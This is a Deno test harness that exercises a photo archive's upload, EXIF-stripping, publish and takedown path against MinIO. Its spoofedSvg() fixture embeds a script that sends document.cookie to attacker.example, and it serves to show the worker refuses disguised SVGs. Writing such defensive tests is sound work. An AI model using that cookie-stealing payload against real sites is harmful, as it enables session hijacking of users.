/* The contribution lifecycle, end to end, against a real S3 implementation.
 *
 * Driven by scripts/lifecycle.sh, which owns the environment contract. Run it, not this.
 *
 * ── What this exists to catch ────────────────────────────────
 *
 * Every piece of the write path has unit tests and none of them touch the piece next to
 * it. request-upload's tests never mint a URL; the worker's tests never receive one;
 * exif-gate runs the pipeline against a directory. The seams between them — a presigned
 * URL an S3 server will actually accept, a job the worker will actually verify, a
 * derivative that actually lands in the bucket the database was told about — are checked
 * by nothing, and every one of them fails silently.
 *
 * Concretely, this is the only thing in the repository that executes
 * `endpoint: r2Endpoint()` at either call site. Comment out both and every unit test still
 * passes — measured, on branch verify/lifecycle-discriminates, run 32360434524 — while
 * check 1 below fails and names the cause:
 *
 *     ✗ the presigned URL points at lifecycle.r2.cloudflarestorage.com,
 *       not 127.0.0.1:9000 — request-upload ignored R2_ENDPOINT
 *
 * ── WHAT A GREEN RUN HERE DOES NOT PROVE ─────────────────────
 *
 * Said plainly and at the top, because a harness that is trusted for more than it checks
 * is worse than no harness:
 *
 *  1. NOT §11 gate 2. That gate says "verified on a real photo carrying GPS data, end to
 *     end", and end to end means the deployed system: a browser PUT to a real R2 bucket,
 *     the container on Cloud Run, the object fetched back through the CDN. This is MinIO
 *     on localhost. The EXIF checks below are the same assertions against a different
 *     storage backend, which is worth having and is not the gate.
 *
 *  2. NOT M1's exit criterion, for the same reason. "A 4K master survives intact in
 *     originals/ while only renditions are CDN-reachable" needs real R2 and a deployed
 *     worker. Neither exists here.
 *
 *  3. "No originals/ object reachable through the public path" is a BUCKET-POLICY PROXY,
 *     not the real assertion. MinIO has no CDN in front of it. What is actually checked is
 *     that the manifest the database accepted names `public` for derivatives and
 *     `originals` for the master — which is a claim about our code, not about whether a
 *     CDN would serve the bytes. The real assertion needs an R2 bucket binding and a
 *     Cloudflare route, and it cannot be made from a laptop or from CI.
 *
 *  4. NOT the CDN, cache headers, TTLs, or anything about `manifest.json`. Different path,
 *     different tests.
 *
 *  5. NOT Cloud Run's behaviour — concurrency, scale-to-zero, the post-202 background
 *     work, or the request timeout. The worker here is a container on a docker network
 *     answering one request at a time.
 *
 * Nothing in this file may be recorded as a launch gate met.
 *
 * ── WHAT IT HAS ACTUALLY CAUGHT ──────────────────────────────
 *
 * Kept because the next person will have to decide whether this job is worth its twenty
 * minutes, and the honest answer is a list rather than an argument. Every one of these was
 * green in the unit suites, and every one of them is a defect no unit test could reach:
 *
 *  · request-upload ignoring R2_ENDPOINT — the mutation this harness was built to catch
 *    (run 32360434524).
 *  · MEDIA_WORKER_URL pointed at 127.0.0.1 from inside the edge-runtime container, so
 *    complete-upload got 502 worker_unreachable (run 32354171082).
 *  · The publisher unreachable by its own trigger: the gateway parses Authorization as a
 *    JWT and PUBLISH_SECRET is not one, so it answered 401 before handler.ts ran.
 *  · takedown deleting nothing, for the same container-loopback reason as the worker — and
 *    invisible until something made those two functions touch a store.
 *  · The moderation queue unable to approve ANYTHING: `Prefer: return=representation` with
 *    no select= is a SELECT of `*`, which migration 0015 revoked. pgTAP asserts the same
 *    approval in SQL, where there is no representation to select, so it passed.
 *  · M3's prerendered item page surviving a takedown. request_takedown returns media_assets
 *    rows and knows nothing about item/{id}/index.html, so the derivatives and the archival
 *    master were deleted and the whole item stayed legible — as HTML, at the exact URL
 *    people had been sharing. Every unit test on both sides passed: takedown.test.ts used a
 *    fake sink that was never given a page to hold, and release.test.ts wrote pages into a
 *    fake that takedown never saw.
 *
 * The pattern is worth naming: every one is a seam between two components that are each
 * correct, and four of the five are about WHICH ADDRESS or WHICH CREDENTIAL, which is
 * exactly what a fake cannot have an opinion about.
 */

import { R2Store } from "../../worker/src/store.ts";
import { buildExifApp1, gpsWireBytes, indexOfBytes, injectExif, RAMALLAH, readGps } from "../../worker/scripts/lib/exif.ts";
import { Checks } from "../../worker/scripts/lib/harness.ts";

/* ── The environment contract ───────────────────────────────── */

function env(name: string, fallback?: string): string {
  const v = Deno.env.get(name) ?? fallback;
  if (!v) throw new Error(`missing required environment variable: ${name}`);
  return v;
}

const SUPABASE_URL = env("SUPABASE_URL", "http://127.0.0.1:54321");
const ANON_KEY = env("SUPABASE_ANON_KEY");
const SERVICE_KEY = env("SUPABASE_SERVICE_ROLE_KEY");
const MINIO_ENDPOINT = env("R2_ENDPOINT", "http://127.0.0.1:9000");
const R2_ACCOUNT_ID = env("R2_ACCOUNT_ID", "lifecycle");
const R2_ACCESS_KEY_ID = env("R2_ACCESS_KEY_ID");
const R2_SECRET_ACCESS_KEY = env("R2_SECRET_ACCESS_KEY");
/* The publisher's own door (M2). Not the service key — see publish/handler.ts: this opens
   exactly one endpoint, behind a lease that already refuses a second concurrent publish. */
const PUBLISH_SECRET = env("PUBLISH_SECRET");
/* What the publisher was told the site is. It writes this into every prerendered page as
   og:url and as the canonical link, so the harness has to be told the same thing — and
   telling it here rather than hardcoding the string is what makes a mismatch between the
   function environment and this run a legible failure instead of a puzzling one. */
const SITE_ORIGIN = env("SITE_ORIGIN", "https://lifecycle.test");

const checks = new Checks();

/**
 * How many assertions actually executed.
 *
 * Checks only records FAILURES, so a run that exits early with nothing wrong is
 * indistinguishable from a run that verified everything — both report zero failures. That
 * is not hypothetical here: the first green lifecycle run took 5 seconds where a previous
 * run took 365, and there was no way to tell "fast because it worked" from "fast because
 * it stopped". (The 365s turned out to be the FAILURE mode — settle() polling out twice —
 * so the fast run was probably right, and "probably" is the problem.)
 *
 * The floor is asserted in CI, the same argument the database job's harness probe makes:
 * a suite that can silently shrink is a suite whose green means nothing.
 */
let executed = 0;
function ck(cond: boolean, msg: string): void {
  executed++;
  checks.check(cond, msg);
}

/* Unset means no prefix, which is what MinIO and CI use and why nothing warned before.
   Against real R2 the physical buckets are `nostaligia-*` while the Bucket union stays
   logical, so a run pointed at the deployed stack must pass R2_BUCKET_PREFIX or every call
   names a bucket that does not exist and R2 answers NoSuchBucket. */
const R2_BUCKET_PREFIX = Deno.env.get("R2_BUCKET_PREFIX") ?? "";

const minio = new URL(MINIO_ENDPOINT);
const store = new R2Store({
  accountId: R2_ACCOUNT_ID,
  accessKeyId: R2_ACCESS_KEY_ID,
  secretAccessKey: R2_SECRET_ACCESS_KEY,
  bucketPrefix: R2_BUCKET_PREFIX,
  endpoint: { host: minio.host, protocol: minio.protocol === "http:" ? "http:" : "https:" },
});

/* ── Talking to the stack ───────────────────────────────────── */

/** Cloudflare's always-pass test secret is configured; any token satisfies it. */
const TURNSTILE_TOKEN = "lifecycle-harness";

async function signUp(email: string): Promise<{ jwt: string; sub: string }> {
  const res = await fetch(`${SUPABASE_URL}/auth/v1/signup`, {
    method: "POST",
    headers: { "Content-Type": "application/json", apikey: ANON_KEY },
    body: JSON.stringify({ email, password: "lifecycle-harness-password-1" }),
  });
  if (!res.ok) throw new Error(`signup failed ${res.status}: ${await res.text()}`);
  const out = await res.json();
  const jwt = out.access_token;
  if (!jwt) throw new Error(`signup returned no session — is email confirmation on? ${JSON.stringify(out)}`);
  return { jwt, sub: out.user.id };
}

function draft(title: string) {
  return {
    title_en: title,
    body_en: "archival description written by the lifecycle harness",
    license: "CC-BY-SA-4.0",
    provenance: "generated fixture, no provenance claim",
    consent: { granted: true },
  };
}

/** Signs an existing user back in. The role claim is minted at token issue (§4), so a
    session opened before a grant carries the old role in its claim until it is re-issued —
    which is why admin-boot.js asks the database instead of trusting the token. */
async function signIn(email: string): Promise<{ jwt: string; sub: string }> {
  const res = await fetch(`${SUPABASE_URL}/auth/v1/token?grant_type=password`, {
    method: "POST",
    headers: { "Content-Type": "application/json", apikey: ANON_KEY },
    body: JSON.stringify({ email, password: "lifecycle-harness-password-1" }),
  });
  if (!res.ok) throw new Error(`sign-in failed ${res.status}: ${await res.text()}`);
  const out = await res.json();
  if (!out.access_token) throw new Error(`sign-in returned no session: ${JSON.stringify(out)}`);
  return { jwt: out.access_token, sub: out.user.id };
}

async function requestUpload(
  jwt: string,
  body: Record<string, unknown>,
): Promise<{ status: number; json: Record<string, unknown> }> {
  const res = await fetch(`${SUPABASE_URL}/functions/v1/request-upload`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      apikey: ANON_KEY,
      Authorization: `Bearer ${jwt}`,
    },
    body: JSON.stringify({ turnstile_token: TURNSTILE_TOKEN, kind: "media", ...body }),
  });
  return { status: res.status, json: await res.json() };
}

async function completeUpload(jwt: string, objectKey: string): Promise<{ status: number; json: Record<string, unknown> }> {
  const res = await fetch(`${SUPABASE_URL}/functions/v1/complete-upload`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      apikey: ANON_KEY,
      Authorization: `Bearer ${jwt}`,
    },
    body: JSON.stringify({ object_key: objectKey }),
  });
  return { status: res.status, json: await res.json() };
}

/** The posts row, read as service_role — the harness is allowed to look behind RLS. */
async function postRow(postId: string): Promise<Record<string, unknown> | null> {
  const res = await fetch(
    `${SUPABASE_URL}/rest/v1/posts?id=eq.${postId}&select=ingest_state,ingest_error,ingest_attempts`,
    { headers: { apikey: SERVICE_KEY, Authorization: `Bearer ${SERVICE_KEY}` } },
  );
  if (!res.ok) return null;
  const rows = await res.json();
  return rows[0] ?? null;
}

async function mediaAssets(postId: string): Promise<Array<Record<string, unknown>>> {
  const res = await fetch(
    `${SUPABASE_URL}/rest/v1/media_assets?post_id=eq.${postId}&select=role,rendition,bucket,storage_path`,
    { headers: { apikey: SERVICE_KEY, Authorization: `Bearer ${SERVICE_KEY}` } },
  );
  return res.ok ? await res.json() : [];
}

/** Makes a signed-up user a moderator. Written as service_role: §4 keeps role out of any
    column a browser can reach, so there is no other way to arrange one. */
async function makeModerator(userId: string): Promise<boolean> {
  const res = await fetch(`${SUPABASE_URL}/rest/v1/user_roles`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      apikey: SERVICE_KEY,
      Authorization: `Bearer ${SERVICE_KEY}`,
      Prefer: "resolution=merge-duplicates",
    },
    body: JSON.stringify({ user_id: userId, role: "moderator", granted_by: userId }),
  });
  await res.body?.cancel();
  return res.ok;
}

/** An approval, exactly as admin.js sends it: `status` and nothing else, as the moderator.
    The trigger supplies approved_by from auth.uid(), and 0042's dispatch hangs off it.
 *
 * Returns the status and the body, not just a count. The first CI run of this section
 * reported "the moderator's approval changed no row" and there was no way to tell an RLS
 * refusal (200 with an empty array) from a constraint violation (400 with a message) from a
 * gateway rejection (401) — three different bugs behind one sentence. Same reasoning as
 * tryFetch above. */
async function approve(
  jwt: string,
  postId: string,
): Promise<{ rows: number; status: number; detail: string }> {
  // select=id,status, exactly as admin.js sends it, and for the reason db.js records:
  // `return=representation` with no select is `*`, and 0015 revoked table-level SELECT on
  // posts. That is the defect this harness found — the dashboard could not approve
  // anything, and pgTAP could not see it because SQL has no representation to select.
  const res = await fetch(`${SUPABASE_URL}/rest/v1/posts?id=eq.${postId}&select=id,status`, {
    method: "PATCH",
    headers: {
      "Content-Type": "application/json",
      apikey: ANON_KEY,
      Authorization: `Bearer ${jwt}`,
      Prefer: "return=representation",
    },
    body: JSON.stringify({ status: "approved" }),
  });
  const text = await res.text();
  let rows = 0;
  try {
    const parsed = JSON.parse(text);
    if (Array.isArray(parsed)) rows = parsed.length;
  } catch { /* not JSON — the detail below carries it */ }
  return { rows, status: res.status, detail: text.slice(0, 400) };
}

/** Reads an object out of the public bucket as text, or null when it is not there. */
async function publicObject(key: string): Promise<string | null> {
  try {
    const bytes = await store.head("public", key, 1024 * 1024);
    return new TextDecoder().decode(bytes);
  } catch {
    return null;
  }
}

/** True when the object is in the public bucket. Cheaper than reading it, and the only
    question the page assertions below need answered after a takedown. */
async function publicExists(key: string): Promise<boolean> {
  return (await publicObject(key)) !== null;
}

/** Waits for the worker to finish. Bounded — a hang must fail, not stall the run. */
async function settle(postId: string, seconds = 180): Promise<Record<string, unknown> | null> {
  for (let i = 0; i < seconds; i++) {
    const row = await postRow(postId);
    if (row && row.ingest_state !== "processing" && row.ingest_state !== "awaiting_bytes") return row;
    await new Promise((r) => setTimeout(r, 1000));
  }
  return await postRow(postId);
}

/* ── The fixtures ───────────────────────────────────────────── */

/** The caption the APP1 carries, so a leak is greppable rather than merely absent. */
const GPS_CAPTION = "LIFECYCLE-SENSITIVE-CAPTION-DO-NOT-PUBLISH";

/** A real JPEG carrying real GPS rationals for Ramallah. Same builder exif-gate.ts uses. */
async function gpsJpeg(): Promise<Uint8Array> {
  const bare = await ffmpegBytes([
    "-f", "lavfi", "-i", "testsrc=size=800x600:duration=1:rate=1",
    "-frames:v", "1", "-f", "mjpeg", "-",
  ]);
  return injectExif(bare, buildExifApp1(RAMALLAH, GPS_CAPTION));
}

/** An SVG that lies about being a PNG. §6 names SVG specifically; the worker sniffs. */
function spoofedSvg(): Uint8Array {
  return new TextEncoder().encode(
    `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">` +
      `<script>fetch("https://attacker.example/"+document.cookie)</script></svg>`,
  );
}

/**
 * fetch that reports a transport failure instead of throwing.
 *
 * This exists because of a specific missed diagnosis. Branch
 * verify/lifecycle-discriminates removed `endpoint: r2Endpoint()` to prove check 1 catches
 * it. The run went red — and produced NO check output at all, because the PUT then went to
 * a Cloudflare host that does not exist, fetch threw, and the process died before
 * checks.report() could say which assertion had failed. A red on no check in particular
 * proves nothing, so that run could not settle the question it was launched to settle.
 *
 * Every network call the harness makes to an address under test goes through here. A dead
 * host becomes a named failing check, which is the whole point of having checks.
 */
async function tryFetch(
  url: string,
  init: RequestInit,
): Promise<{ ok: boolean; status: number; detail: string }> {
  try {
    const res = await fetch(url, init);
    return { ok: res.ok, status: res.status, detail: res.ok ? "" : await res.text() };
  } catch (e) {
    return { ok: false, status: 0, detail: `transport failure reaching ${url}: ${e}` };
  }
}

async function ffmpegBytes(args: string[]): Promise<Uint8Array> {
  const cmd = new Deno.Command("ffmpeg", {
    args: ["-loglevel", "error", "-nostdin", ...args],
    stdout: "piped",
    stderr: "piped",
    stdin: "null",
  });
  const { code, stdout, stderr } = await cmd.output();
  if (code !== 0) throw new Error(`ffmpeg failed: ${new TextDecoder().decode(stderr)}`);
  return stdout;
}

/* ── The run ────────────────────────────────────────────────── */

console.log("# lifecycle — request-upload → MinIO → complete-upload → worker\n");

const stamp = crypto.randomUUID().slice(0, 8);
const member = await signUp(`lifecycle-${stamp}@harness.local`);
console.log(`member ${member.sub}`);

/* ── 1 · The seam. The whole reason R2_ENDPOINT exists. ─────── */

const photo = await gpsJpeg();
const first = await requestUpload(member.jwt, {
  mime: "image/jpeg",
  bytes: photo.byteLength,
  draft: draft("gps fixture"),
});

ck(first.status === 200, `request-upload refused a valid request: ${first.status} ${JSON.stringify(first.json)}`);

const upload = first.json.upload as { url: string; headers: Record<string, string>; method: string } | undefined;
ck(upload !== undefined, "request-upload returned no upload block");

if (upload) {
  const signedHost = new URL(upload.url).host;
  // THE assertion nothing else in the repository makes. If request-upload ignored
  // R2_ENDPOINT this is `<account>.r2.cloudflarestorage.com` and everything below fails
  // in a way that looks like a network problem. Named here so it does not.
  ck(
    signedHost === minio.host,
    `the presigned URL points at ${signedHost}, not ${minio.host} — request-upload ignored R2_ENDPOINT`,
  );
}

/* ── 2 · An S3 server accepts what we signed ────────────────── */

const objectKey = String(first.json.object_key ?? "");
const postId = String(first.json.post_id ?? "");

if (upload) {
  const put = await tryFetch(upload.url, {
    method: upload.method,
    headers: upload.headers,
    body: photo as unknown as BodyInit,
  });
  // MinIO recomputes the signature from the request it receives, including the
  // content-length binding §6's quota depends on. A 403 here is a canonicalisation bug,
  // not a credentials problem — sigv4.ts's header says exactly this.
  //
  // status 0 means the host did not answer at all, which is what a URL signed for
  // Cloudflare looks like from a runner with no R2 account. Reported as a failed check
  // rather than an exception, so check 1 above stays the one that names the cause.
  ck(put.ok, `the presigned PUT did not succeed: ${put.status} ${put.detail}`);
}

/* ── 3 · complete-upload → the worker → the buckets ─────────── */

const done = await completeUpload(member.jwt, objectKey);
ck(done.status === 200 || done.status === 202, `complete-upload failed: ${done.status} ${JSON.stringify(done.json)}`);

const settled = await settle(postId);
ck(
  settled?.ingest_state === "ready",
  `ingest did not reach 'ready': ${JSON.stringify(settled)}`,
);

const assets = await mediaAssets(postId);
const master = assets.find((a) => a.role === "master");
const derivatives = assets.filter((a) => a.role !== "master");

ck(master !== undefined, "no master row — the preservation copy was never recorded");
ck(derivatives.length > 0, "no derivative rows — nothing was produced for the public bucket");

// The bucket split, §6. NOTE: this is the PROXY described at the top of this file — it
// asserts what our code recorded, not what a CDN would serve. MinIO has no CDN.
ck(master?.bucket === "originals", `the master landed in ${master?.bucket}, not originals`);
ck(
  derivatives.every((d) => d.bucket === "public"),
  `a derivative landed outside public/: ${JSON.stringify(derivatives.map((d) => d.bucket))}`,
);

/* ── 4 · §11 gate 2's assertions, against MinIO ─────────────── */

if (master) {
  const kept = await store.head("originals", String(master.storage_path), 65536);
  const gps = readGps(kept);
  // BOTH directions. A pipeline that stripped everything everywhere would pass a naive
  // "no EXIF anywhere" check while destroying the preservation copy §6 exists to keep.
  ck(
    gps !== null,
    "the archival master lost its GPS — originals/ is supposed to be untouched",
  );
}

for (const d of derivatives) {
  const bytes = await store.head("public", String(d.storage_path), 65536);
  ck(
    readGps(bytes) === null,
    `a public derivative still carries GPS: ${d.storage_path}`,
  );
  ck(
    indexOfBytes(bytes, gpsWireBytes(RAMALLAH.latitude)) === -1,
    `a public derivative carries the latitude rational verbatim: ${d.storage_path}`,
  );
}

/* ── 5 · A spoofed PNG is refused at the WORKER, not earlier ── */

// The declared type passes request-upload's allowlist — that is the point. §6 says
// "validate by magic bytes, not extension", and this is the request that finds out whether
// anything actually does. The refusal has to come from the worker's sniffer.
const svg = spoofedSvg();
const spoof = await requestUpload(member.jwt, {
  mime: "image/png",
  bytes: svg.byteLength,
  draft: draft("spoofed png"),
});
ck(spoof.status === 200, `request-upload refused the declared PNG early: ${spoof.status}`);

const spoofUpload = spoof.json.upload as { url: string; headers: Record<string, string>; method: string } | undefined;
const spoofKey = String(spoof.json.object_key ?? "");
const spoofPost = String(spoof.json.post_id ?? "");

if (spoofUpload) {
  const spoofPut = await tryFetch(spoofUpload.url, {
    method: spoofUpload.method,
    headers: spoofUpload.headers,
    body: svg as unknown as BodyInit,
  });
  ck(spoofPut.ok, `the spoofed-PNG PUT did not succeed: ${spoofPut.status} ${spoofPut.detail}`);
  await completeUpload(member.jwt, spoofKey);
  const row = await settle(spoofPost);
  ck(
    row?.ingest_state === "failed",
    `an SVG declared image/png was not refused: ${JSON.stringify(row)}`,
  );
  ck(
    (await mediaAssets(spoofPost)).length === 0,
    "the spoofed SVG produced media_assets rows — bytes reached the public bucket",
  );
}

/* ── 6 · Quota exhaustion refuses BEFORE a URL is minted ────── */

// The §6 cost ceiling is "enforced in the database", and the thing that makes it a ceiling
// rather than a speed bump is WHERE it refuses. A signed URL handed out and then regretted
// is a signed URL that still works for five minutes.
const quotaMember = await signUp(`lifecycle-quota-${stamp}@harness.local`);

// Exhaust the member's daily count. public.upload_daily_limits() gives a member 20.
let exhausted: { status: number; json: Record<string, unknown> } | null = null;
for (let i = 0; i < 22; i++) {
  const r = await requestUpload(quotaMember.jwt, {
    mime: "image/jpeg",
    bytes: 1024,
    draft: draft(`quota probe ${i}`),
  });
  if (r.status === 429) {
    exhausted = r;
    break;
  }
}

ck(exhausted !== null, "the daily upload count never refused — the quota is not a ceiling");
if (exhausted) {
  ck(
    exhausted.json.error === "quota_exceeded",
    `refused, but not as a quota: ${JSON.stringify(exhausted.json)}`,
  );
  // THE assertion. Not "it was refused" — "it was refused before anything was signed".
  ck(
    exhausted.json.upload === undefined,
    "a URL was minted for a request over quota — the refusal is after the signing, not before it",
  );
}

/* ── 7 · A REAL publish, and a real takedown (M2) ───────────── */

// The same argument this file was written for, applied to the other half of the system.
// Every M2 test until now ran against a FakeSink that recorded the call: the shard bytes,
// the cache-control headers, the manifest flip and the delete had never been through an S3
// server. R2Sink had no R2_ENDPOINT seam at all, so this could not have been run even if
// somebody had wanted to — adding it is what makes the section below possible.
//
/** M4: a gazetteer entry, created exactly as the dashboard creates one.
 *
 * Through the RPC rather than through a table INSERT, because that is what admin.js does
 * and because `location` is a geography: 0048 exists so no browser ever assembles an EWKT
 * literal. SECURITY INVOKER, so this call is refused unless 0017's policy really does admit
 * this moderator — a member's token would land on a policy violation here, and that is the
 * boundary rather than anything inside the function.
 */
async function savePlace(
  jwt: string,
  name: string,
): Promise<{ ok: boolean; detail: string }> {
  const res = await fetch(`${SUPABASE_URL}/rest/v1/rpc/save_place`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      apikey: ANON_KEY,
      Authorization: `Bearer ${jwt}`,
    },
    // p_id and p_aliases are omitted so the function's own defaults apply — the same shape
    // the dashboard sends when it is creating rather than correcting.
    body: JSON.stringify({
      p_name_ar: name,
      p_name_en: name,
      p_lat: 31.8996,
      p_lon: 35.2042,
      p_unconfirmed: false,
    }),
  });
  const text = await res.text();
  // Matched with a pattern rather than a literal: this is jsonb rendered by Postgres and
  // relayed by PostgREST, and neither promises the spacing. A test that depended on it
  // would fail on an upgrade and look like a permissions problem.
  return {
    ok: res.ok && /"saved":\s*true/.test(text),
    detail: `${res.status} ${text.slice(0, 300)}`,
  };
}

// WHAT IS STILL NOT PROVED HERE, and it is the same list as the top of this file: MinIO is
// not R2, there is no CDN, and "the pointer flipped" is asserted by reading the object back
// out of the bucket rather than by watching a browser follow it.

const mod = await signUp(`lifecycle-mod-${stamp}@harness.local`);
ck(await makeModerator(mod.sub), "could not grant the moderator role — the rest of §7 is untestable");

// Re-authenticated, and NOT because the approval needs it: policy 0018 calls
// is_moderator(), which reads user_roles from the DATABASE rather than from the token — the
// same choice admin-boot.js makes, because a claim is stale for up to an hour after a
// change. The fresh token is for everything that DOES read the claim, request-upload's
// role-aware caps among them, so the harness carries a session that agrees with the row.
const modSession = await signIn(`lifecycle-mod-${stamp}@harness.local`);

const approved = await approve(modSession.jwt, postId);
ck(
  approved.rows === 1,
  `the moderator's approval changed no row: ${approved.status} ${approved.detail}`,
);

// M4. Created before the publish below so the release has a gazetteer to carry, and named
// with the run stamp so the shard assertion in §7a is about THIS entry rather than about
// the file being non-empty for some other reason.
const placeName = `harness-place-${stamp}`;
const placeSaved = await savePlace(modSession.jwt, placeName);
ck(placeSaved.ok, `a moderator could not create a gazetteer entry: ${placeSaved.detail}`);

// 0042: approving dispatches the publisher. That POST goes nowhere in this harness — no
// Vault secret is set, so publish_tick answers not_configured — which is deliberate. The
// publish below is made by hand for the same reason exif-gate calls the pipeline directly:
// what is under test is the publisher, not pg_net's delivery.
const published = await tryFetch(`${SUPABASE_URL}/functions/v1/publish`, {
  method: "POST",
  headers: { "Content-Type": "application/json", Authorization: `Bearer ${PUBLISH_SECRET}` },
  body: JSON.stringify({ source: "lifecycle" }),
});
ck(published.ok, `the publisher refused: ${published.status} ${published.detail}`);

// THE assertion nothing else makes: the pointer object is really in the bucket, and it
// really names a release directory. A FakeSink cannot tell you an S3 server accepted the
// PUT, and §2's whole read path begins by fetching this one object.
const manifest = await publicObject("manifest.json");
ck(manifest !== null, "no manifest.json in the bucket — the pointer never landed");

const release = manifest ? (JSON.parse(manifest).release as string) : "";
ck(/^\/v\/\d{4}-\d{2}-\d{2}T/.test(release), `manifest names no release: ${manifest}`);

// The shard the manifest points at has to exist, and has to carry the item. A pointer to a
// directory with a missing shard is a page that 404s for a year, cached.
const feed = release ? await publicObject(`${release.slice(1)}feed/page-1.json`) : null;
ck(feed !== null, `the release names no feed page: ${release}feed/page-1.json is not there`);
ck(feed !== null && feed.includes(postId), "the published feed does not contain the approved item");

// §7, on the bytes rather than on our intentions. The published shard is scanned for the
// caption the master's EXIF carries and for the uploader's user id — the two things §7
// names as the aggregate that de-anonymises a contributor.
ck(feed === null || !feed.includes(GPS_CAPTION), "the published feed carries the master's EXIF caption");
ck(feed === null || !feed.includes(member.sub), "the published feed carries the uploader's user id (§7)");

/* ── 7a · M4's gazetteer shard ──────────────────────────────
 *
 * The map draws no text of its own — every name on it comes from this file — so a release
 * that reached the bucket without it is a map of a city with no names on it, which reads as
 * a styling choice rather than as a missing shard.
 *
 * Asserted here rather than only in release.test.ts because this is the first time
 * publishable_places (0050) is actually CALLED: the unit tests hand the publisher a fake
 * database, so a wrong RPC name or a missing service_role grant would look identical to an
 * empty gazetteer right up until a deployment. The entry looked for is the one this harness
 * created above, so an empty shard fails as loudly as a missing one.
 */

const placesShard = release ? await publicObject(`${release.slice(1)}places.json`) : null;
ck(placesShard !== null, `the release carries no places.json: ${release}places.json is not there`);
ck(
  placesShard !== null && placesShard.includes(placeName),
  "places.json does not carry the gazetteer entry a moderator just created",
);

/* ── 7b · §9's prerendered page, in the bucket ──────────────
 *
 * THE seam this section exists for, and it has the same shape as every other one this
 * harness has caught: two components that are each correct on their own.
 *
 * release.ts writes item/{id}/index.html at the ROOT of the bucket rather than inside
 * /v/{ts}/ — a permalink cannot require resolving a pointer first — and prerender.test.ts
 * proves the bytes are right. What no unit test can reach is whether an S3 server accepts
 * an object with that key and that content type, at a path with a slash in the middle,
 * from the same signer everything else uses.
 *
 * NOT §10's M3 exit criterion. "An item URL pastes into WhatsApp with a real preview" needs
 * a crawler fetching a real domain; this is MinIO on a docker network with no DNS name and
 * no route from the public internet. What is asserted here is that the page is generated,
 * that it lands, and that it carries the tags — which is the part that can be got wrong
 * silently.
 */

const pageKey = `item/${postId}/index.html`;
const pageBody = await publicObject(pageKey);
ck(pageBody !== null, `no prerendered page at ${pageKey} — a shared link would 404`);

if (pageBody !== null) {
  // The card itself. og:url absolute, because a crawler resolves nothing: it fetches the
  // URL it was given and reads the tags verbatim.
  ck(
    pageBody.includes(`property="og:url" content="${SITE_ORIGIN}/item/${postId}"`),
    "the page carries no absolute og:url — the preview would resolve to no host",
  );
  ck(pageBody.includes('property="og:title"'), "the page carries no og:title");
  ck(
    pageBody.includes("<!DOCTYPE html>") && pageBody.includes('<main id="view">'),
    "the page is not the SPA shell — a reader with JavaScript would get nothing to hydrate",
  );

  // §7, on these bytes as well as on the shard. The prerenderer takes publicPost()'s output
  // so it CANNOT reach a withheld field — this asserts that the gate is actually in the
  // path rather than that the fields happen to be unused.
  ck(!pageBody.includes(GPS_CAPTION), "the prerendered page carries the master's EXIF caption");
  ck(!pageBody.includes(member.sub), "the prerendered page carries the uploader's user id (§7)");

  // CDN_ORIGIN is deliberately unset in this environment, so there is no absolute image URL
  // to emit. The honest degradation is a small card, and asserting it here is what stops a
  // future change guessing an image host and publishing thousands of cached pages pointing
  // at a URL that has never existed.
  ck(
    !pageBody.includes("og:image") && pageBody.includes('content="summary"'),
    "with no CDN configured the card must step down to summary rather than claim an image",
  );
}

// §8: "delete/rename the object in R2 immediately … the next scheduled publish removes it
// from the shards as a formality — the bytes are already gone." Asserted as bytes.
const thumb = (await mediaAssets(postId)).find((a) => a.role === "thumb");
const thumbPath = String(thumb?.storage_path ?? "");
ck(thumbPath !== "", "no thumb to take down");
ck(await publicObject(thumbPath) !== null, "the derivative was not in the bucket before takedown");

const tookDown = await tryFetch(`${SUPABASE_URL}/functions/v1/takedown`, {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    apikey: ANON_KEY,
    Authorization: `Bearer ${modSession.jwt}`,
  },
  body: JSON.stringify({ post_id: postId, note: "lifecycle harness" }),
});

// 207, and that is the CORRECT answer rather than a tolerated one. The CDN purger is
// deliberately unconfigured here, so §8's step 2 cannot be done; handler.ts answers 207 —
// "the post IS marked and hidden, and some part of the removal did not complete" — which is
// exactly the honest report. 200 would mean the purge happened, and asserting it would mean
// asserting something untrue about this environment.
ck(
  tookDown.status === 207,
  `takedown answered ${tookDown.status}, expected 207 with an unconfigured purger: ${tookDown.detail}`,
);
ck(await publicObject(thumbPath) === null, "the derivative is STILL in the bucket after a takedown (§8)");

// The page, and this is the assertion the section header names. Before takedown.ts deleted
// it, everything above this line passed while the item's title, story, byline and
// photograph stayed readable at a root URL — which is the one place a stranger who was sent
// a link actually goes.
ck(
  !(await publicExists(pageKey)),
  `the prerendered page is STILL served after a takedown: ${pageKey}`,
);

// §8 step 3. The list is what a client filters against between the takedown and the next
// release, so it is the only thing standing between a cached shard and a card for content
// that is gone.
const redactions = await publicObject("redactions.json");
ck(redactions !== null, "no redactions.json at the root");
ck(redactions !== null && redactions.includes(postId), "redactions.json does not name the taken-down item");

// Printed BEFORE report(), which exits. CI gates on this number: a run that stops early
// has zero failures and looks identical to a run that verified everything, which is the
// hole a count closes. M3 added seven page assertions and one after the takedown, so the
// figure is now 26 fixed sites plus twice the derivative count.
console.log(`\nLIFECYCLE checks=${executed} failures=${checks.failures.length}`);

checks.report(
  "lifecycle: all checks passed.\n" +
    "NOT a gate met. MinIO is not R2, localhost is not Cloud Run, and there is no CDN in\n" +
    "this run — see the header for the five things a green result here does not prove.",
);
